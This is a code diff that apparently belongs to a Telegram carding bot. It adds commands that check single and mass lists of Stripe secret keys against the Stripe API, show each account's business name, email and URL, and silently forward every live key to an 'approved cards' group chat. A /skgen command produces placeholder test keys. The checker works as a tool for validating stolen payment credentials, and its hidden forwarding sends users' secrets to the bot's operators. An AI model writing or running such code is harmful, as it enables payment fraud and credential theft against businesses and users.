@@ -2707,6 +2707,223 @@ def split_txt_file(message):
     except Exception as e:
         bot.reply_to(message, f"❌ Error: {str(e)}")
 
+# Format Stripe Key result
+def stripe_key_format(key, mode, account_info):
+    result = f"""
+<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
+<a href='https://t.me/stormxvup'>┃ 𝐒𝐭𝐫𝐢𝐩𝐞 𝐊𝐞𝐲 𝐂𝐡𝐞𝐜𝐤</a>
+<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>
+
+<a href='https://t.me/stormxvup'>[⸙]</a> 𝐊𝐞𝐲 ⌁ <code>{key}</code>
+<a href='https://t.me/stormxvup'>[⸙]</a> 𝐌𝐨𝐝𝐞 ⌁ <i>{mode}</i>
+<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
+<a href='https://t.me/stormxvup'>[⸙]</a> 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐈𝐃 ⌁ {account_info.get("id", "N/A")}
+<a href='https://t.me/stormxvup'>[⸙]</a> 𝐁𝐮𝐬𝐢𝐧𝐞𝐬𝐬 𝐍𝐚𝐦𝐞 ⌁ {account_info.get("business_profile", {}).get("name", "N/A")}
+<a href='https://t.me/stormxvup'>[⸙]</a> 𝐄𝐦𝐚𝐢𝐥 ⌁ {account_info.get("email", "N/A")}
+<a href='https://t.me/stormxvup'>[⸙]</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⌁ {account_info.get("country", "N/A")}
+<a href='https://t.me/stormxvup'>[⸙]</a> 𝐁𝐮𝐬𝐢𝐧𝐞𝐬𝐬 𝐔𝐑𝐋 ⌁ {account_info.get("business_profile", {}).get("url", "N/A")}
+<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>"""
+    return result
+
+# Handle /sk command
+@bot.message_handler(commands=['sk'])
+@bot.message_handler(func=lambda m: m.text and m.text.startswith('.sk'))
+def handle_sk(message):
+    user_id = message.from_user.id
+    init_user(user_id, message.from_user.username)
+
+    command_parts = message.text.split()
+    if len(command_parts) < 2:
+        bot.reply_to(message, "❌ Please provide a Stripe Key. Format: `.sk <key>`")
+        return
+
+    stripe_key = command_parts[1].strip()
+    mention = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
+    status_message = bot.reply_to(message, f"🔍 Checking Stripe Key...", parse_mode='HTML')
+
+    try:
+        import stripe
+        stripe.api_key = stripe_key
+        account = stripe.Account.retrieve()
+
+        mode = "Live" if not stripe_key.startswith("sk_test") else "Test"
+
+        response_text = stripe_key_format(stripe_key, mode, account)
+
+        bot.edit_message_text(
+            chat_id=message.chat.id,
+            message_id=status_message.message_id,
+            text=response_text,
+            parse_mode='HTML'
+        )
+
+        # Send live keys to approved cards group
+        if mode == "Live":
+            try:
+                bot.send_message(
+                    chat_id=APPROVED_CARDS_GROUP_ID,
+                    text=response_text,
+                    parse_mode='HTML'
+                )
+            except Exception as e:
+                print(f"Failed to send to group: {e}")
+
+    except Exception as e:
+        bot.edit_message_text(
+            chat_id=message.chat.id,
+            message_id=status_message.message_id,
+            text=f"❌ Invalid key or error: {str(e)}",
+            parse_mode='HTML'
+        )
+
+
+# Handle /msk command
+@bot.message_handler(commands=['msk'])
+@bot.message_handler(func=lambda m: m.text and m.text.startswith('.msk'))
+def handle_msk(message):
+    user_id = message.from_user.id
+    init_user(user_id, message.from_user.username)
+
+    try:
+        keys_text = None
+        command_parts = message.text.split()
+
+        if len(command_parts) > 1:
+            keys_text = ' '.join(command_parts[1:])
+        elif message.reply_to_message:
+            keys_text = message.reply_to_message.text
+        else:
+            bot.reply_to(message, "❌ Please provide keys after command or reply to a message containing keys.")
+            return
+
+        keys = [k.strip() for k in keys_text.split() if k.strip()]
+        if not keys:
+            bot.reply_to(message, "❌ No valid keys found.")
+            return
+
+        if len(keys) > MAX_MASS_CHECK:
+            keys = keys[:MAX_MASS_CHECK]
+            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} keys allowed. Checking first {MAX_MASS_CHECK} keys only.")
+
+        if not use_credits(user_id, len(keys)):
+            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
+            return
+
+        # Send initial message once
+        initial_msg = f"🚀 Starting mass Stripe Key check of {len(keys)} keys...\nProcessing..."
+        status_message = bot.reply_to(message, initial_msg)
+
+        start_time = time.time()
+
+        def process_keys():
+            results_text = ""  # accumulate results here
+
+            for i, key in enumerate(keys, 1):
+                try:
+                    import stripe
+                    stripe.api_key = key
+                    account = stripe.Account.retrieve()
+                    mode = "Live" if not key.startswith("sk_test") else "Test"
+                    formatted_response = stripe_key_format(key, mode, account)
+
+                    results_text += f"{formatted_response}\n\n"
+
+                    # Send live keys to approved cards group
+                    if mode == "Live":
+                        try:
+                            bot.send_message(
+                                chat_id=APPROVED_CARDS_GROUP_ID,
+                                text=formatted_response,
+                                parse_mode='HTML'
+                            )
+                        except Exception as e:
+                            print(f"Failed to send live key to group: {e}")
+
+                except Exception as e:
+                    results_text += f"❌ Key: <code>{key}</code> | Error: {str(e)}\n\n"
+
+                # Update the single message with current accumulated results
+                elapsed = round(time.time() - start_time, 2)
+                try:
+                    bot.edit_message_text(
+                        chat_id=message.chat.id,
+                        message_id=status_message.message_id,
+                        text=f"🕒 Checked {i}/{len(keys)} keys | Time: {elapsed}s\n\n{results_text}",
+                        parse_mode='HTML'
+                    )
+                except Exception as e:
+                    print(f"Failed to edit message: {e}")
+
+        thread = threading.Thread(target=process_keys)
+        thread.start()
+
+    except Exception as e:
+        bot.reply_to(message, f"❌ An error occurred: {str(e)}")
+
+# Handle /skgen command
+@bot.message_handler(commands=['skgen'])
+@bot.message_handler(func=lambda m: m.text and m.text.startswith('.skgen'))
+def handle_skgen(message):
+    command_parts = message.text.split()
+    
+    if len(command_parts) < 2:
+        bot.reply_to(message, "❌ Please specify the number of SK keys to generate. Example: .skgen 5")
+        return
+    
+    try:
+        count = int(command_parts[1])
+        if count <= 0:
+            bot.reply_to(message, "❌ Count must be at least 1")
+            return
+        elif count > 5000:
+            count = 5000
+            bot.reply_to(message, "⚠️ Maximum count is 5000. Generating 5000 SK keys.")
+    except ValueError:
+        bot.reply_to(message, "❌ Invalid count. Please enter a number.")
+        return
+    
+    status_msg = bot.reply_to(message, f"🔄 Generating {count} SK keys...")
+
+    def generate_keys():
+        try:
+            # Generate SK keys (dummy/test keys here, replace with your own generator)
+            sk_keys = [f"sk_test_{i:08x}" for i in range(count)]
+            
+            if count <= 10:
+                formatted_keys = "\n".join(f"<a href='https://t.me/stormxvup'>[⸙]</a> <code>{key}</code>" for key in sk_keys)
+                result = f"""
+<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
+<a href='https://t.me/stormxvup'>┃ 𝐒𝐊 𝐊𝐞𝐲 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝</a>
+<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>
+
+{formatted_keys}
+
+<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
+"""
+                bot.edit_message_text(chat_id=message.chat.id,
+                                      message_id=status_msg.message_id,
+                                      text=result,
+                                      parse_mode='HTML')
+            else:
+                # If >10 keys, generate a text file
+                filename = f'skgen_{message.from_user.id}.txt'
+                with open(filename, 'w') as f:
+                    f.write("\n".join(sk_keys))
+                
+                with open(filename, 'rb') as f:
+                    bot.send_document(message.chat.id, f, caption=f"Generated {count} SK keys 💳")
+                
+                bot.delete_message(chat_id=message.chat.id, message_id=status_msg.message_id)
+
+        except Exception as e:
+            bot.edit_message_text(chat_id=message.chat.id,
+                                  message_id=status_msg.message_id,
+                                  text=f"❌ Error generating SK keys: {str(e)}")
+
+    threading.Thread(target=generate_keys).start()
+
+
+
 # Handle both /gen and .gen
 @bot.message_handler(commands=['gen'])
 @bot.message_handler(func=lambda m: m.text and m.text.startswith('.gen'))
